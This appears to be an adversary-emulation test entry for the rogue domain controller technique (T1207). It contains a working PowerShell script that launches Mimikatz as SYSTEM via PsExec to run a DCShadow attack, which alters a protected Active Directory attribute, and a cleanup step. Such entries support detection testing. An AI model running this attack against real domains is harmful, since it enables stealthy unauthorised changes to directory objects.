# T1207 - Rogue Domain Controller
### Attacks
* DCShadow - Mimikatz
	* References
		* [DCShadow](https://www.dcshadow.com/)
		* [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
	* Overview
		* Use Mimikatz DCShadow method to simulate behavior of a Domain Controller and edit protected attribute.
		* It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
	* Command

		```pwsh
		Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount
		```

		* Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
		* The easiest is to run elevated and as a Domain Admin user.
	* Requirements
		* Administrative Privileges 
	* Command

		```powershell
		# starting fake DC server, as SYSTEM (required)
		$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
		Remove-Item $dc_output_file -ErrorAction Ignore
		$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
		$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"

		# wait for fake DC server to be ready...
		Start-Sleep -Seconds 5

		# server ready, so trigger replication (push) and wait until it finished
		& #{mimikatz_path} "lsadump::dcshadow /push" "exit"

		Write-Host "`nWaiting for fake DC server to return"
		Wait-Process $dc

		Write-Host "`nOutput from fake DC server:"
		Get-Content $dc_output_file
		Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
		Remove-Item $dc_output_file -ErrorAction Ignore

		Write-Host "End of DCShadow"
		```
	* Cleanup

		```powershell
		Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
		```
